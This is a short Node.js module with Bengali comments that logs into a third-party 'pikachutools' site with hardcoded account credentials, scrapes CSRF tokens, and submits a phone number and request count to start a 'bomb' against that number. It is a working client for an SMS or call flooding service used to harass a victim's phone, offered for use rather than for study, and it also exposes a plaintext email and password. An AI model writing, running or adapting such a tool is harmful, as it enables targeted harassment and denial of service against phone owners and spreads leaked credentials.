const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');
const FormData = require('form-data');

const email = 'maxjihad59@gmail.com';
const password = 'Likhon@#12';

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

async function login() {
  try {
    // Login page থেকে টোকেন নাও
    const loginPage = await client.get('https://www.pikachutools.my.id/user/login');
    const $ = cheerio.load(loginPage.data);
    const token = $('input[name="_token"]').val();

    // Login POST request পাঠাও
    const loginRes = await client.post('https://www.pikachutools.my.id/user/login', {
      email,
      password,
      _token: token
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    // লগিন সফল হলে true রিটার্ন করো
    return true;
  } catch (e) {
    console.error('Login error:', e.message);
    return false;
  }
}

async function sendBomb(phone, amount) {
  try {
    // লগিনের পরে user পেজ থেকে আবার CSRF টোকেন নাও
    const userPage = await client.get('https://www.pikachutools.my.id/user');
    const $ = cheerio.load(userPage.data);
    const token = $('input[name="_token"]').val();

    // FormData তৈরি করো
    const form = new FormData();
    form.append('_token', token);
    form.append('nomor', phone);
    form.append('jumlah', amount);

    // POST request পাঠাও user পেজে
    const res = await client.post('https://www.pikachutools.my.id/user', form, {
      headers: form.getHeaders()
    });

    if (res.data && res.data.status === true) {
      return `✅ Bomb started to ${phone} with ${amount} requests.`;
    } else {
      return `❌ Bomb failed: ${JSON.stringify(res.data)}`;
    }
  } catch (e) {
    console.error('Send Bomb error:', e.message);
    return `❌ Error: ${e.message}`;
  }
}

module.exports = { login, sendBomb };
